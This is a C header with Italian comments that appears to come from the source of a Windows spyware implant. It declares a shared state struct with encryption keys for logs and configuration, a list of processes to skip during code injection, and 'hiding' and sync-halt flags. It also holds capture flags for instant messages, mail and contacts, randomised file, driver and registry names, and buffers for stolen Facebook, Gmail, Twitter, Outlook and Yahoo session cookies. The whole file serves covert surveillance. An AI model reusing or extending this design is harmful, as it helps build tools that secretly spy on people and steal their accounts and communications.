#pragma once

#ifndef __BSS_H
#define __BSS_H
#include "aes_alg.h"

typedef struct _bss_seg {
	BOOL is_demo_version;
	BYTE crypt_key[KEY_LEN];		// Chiave di cifratura
	BYTE crypt_key_conf[KEY_LEN];   // Chiave di cifratura per la conf

	aes_context crypt_ctx;		// Context per la cifratura
	aes_context crypt_ctx_conf; // Context per la cifratura per la conf

	BOOL g_remove_driver;	// Indica se rimuovere o meno il driver sulla disinstallazione
	DWORD log_free_space;   // Spazio a disposizione per i log
	DWORD log_active_queue; // Quale coda e' attiva 1 o 0
	DWORD process_bypassed; //Numero di processi da bypassare
	char process_bypass_list[MAX_DYNAMIC_BYPASS + EMBEDDED_BYPASS][MAX_PBYPASS_LEN]; // Lista dei processi su cui non fare injection
	WCHAR process_bypass_desc[EMBEDDED_BYPASS][MAX_PBYPASS_LEN]; // Lista dei processi su cui non fare injection
	DWORD social_process_control;	// Semaforo per controllare il processo "social"
	BOOL network_crisis;			// Se deve fermare le sync
	BOOL system_crisis;				// Se deve fermare i comandi e l'hiding
	BOOL bPM_IMStarted;				// Flag che indica se il monitor e' attivo o meno
	BOOL bPM_MailCapStarted;		// Indica se l'agente e' attivo o meno
	BOOL bPM_ContactsStarted;

	DWORD max_social_mail_len;		// Dimensione oltre la quale sega un messaggio di gmail

	// Nomi dei file di sistema.
	// Sono qui perche' ad esempio anche le funzioni di 
	// setup dei wrapper devono poterci accedere dall'interno
	// dei processi iniettati.
	char H4DLLNAME[MAX_RAND_NAME];
	char H4_CONF_FILE[MAX_RAND_NAME];
	char H4_CONF_BU[MAX_RAND_NAME];
	char H4_HOME_DIR[MAX_RAND_NAME];
	char H4_HOME_PATH[DLLNAMELEN];
	char H4_CODEC_NAME[MAX_RAND_NAME];
	char H4_DUMMY_NAME[MAX_RAND_NAME];
	char H4_MOBCORE_NAME[MAX_RAND_NAME];
	char H4_MOBZOO_NAME[MAX_RAND_NAME];
	char H64DLL_NAME[MAX_RAND_NAME];
	char H4DRIVER_NAME[MAX_RAND_NAME];
	char H4DRIVER_NAME_ALT[MAX_RAND_NAME];
	char H4_UPDATE_FILE[MAX_RAND_NAME];
	char REGISTRY_KEY_NAME[MAX_RAND_NAME];
	//char OLD_REGISTRY_KEY_NAME[MAX_RAND_NAME];
	char EXE_INSTALLER_NAME[MAX_RAND_NAME];

	char SHARE_MEMORY_READ_NAME[MAX_RAND_NAME];
	char SHARE_MEMORY_WRITE_NAME[MAX_RAND_NAME];
	char SHARE_MEMORY_ASP_COMMAND_NAME[MAX_RAND_NAME];

	char FACEBOOK_IE_COOKIE[1024];
	char GMAIL_IE_COOKIE[1024];
	char TWITTER_IE_COOKIE[1024];
	char OUTLOOK_IE_COOKIE[1024];
	char YAHOO_IE_COOKIE[1024];

} BSS_SEG;

#ifdef __cplusplus
extern "C" 
#endif
BSS_SEG shared;
#endif

